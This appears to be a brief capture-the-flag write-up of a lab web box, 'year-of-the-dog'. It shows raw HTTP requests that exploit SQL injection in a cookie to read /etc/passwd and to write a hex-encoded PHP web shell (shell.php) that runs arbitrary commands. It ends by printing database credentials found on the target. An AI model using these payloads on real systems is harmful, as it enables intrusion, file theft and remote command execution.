

Found website on port 80, uses "id" cookie.
It turns out there's a SQL injection possible on the cookie, and using `LOAD_FILE` we can load files.

```
GET /index.php HTTP/1.1
Host: 10.10.78.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: id=d9bc8472b0c8fa83ac3d31cc0cbdddeb' UNION SELECT null,LOAD_FILE('/etc/passwd')-- -
Upgrade-Insecure-Requests: 1


```

use
```
GET /index.php HTTP/1.1
Host: 10.10.78.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: id=d9bc8472b0c8fa83ac3d31cc0cbdddeb' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -
Upgrade-Insecure-Requests: 1


```
the payload ()

to create a file named `shell.php` , which executes any `?cmd=` command you put in.

Found credentials:
```
www-data@year-of-the-dog:/var/www/html$ cat config.php 
<?php
        $servername = "localhost";
        $username = "web";
        $password = "Cda3RsDJga";
        $dbname = "webapp";
        $dbh = new mysqli($servername, $username, $password, $dbname);
        if ($dbh->connect_error){
                die("Connection failed: ". $dbh->connect_error);
        }
?>
```
useless.
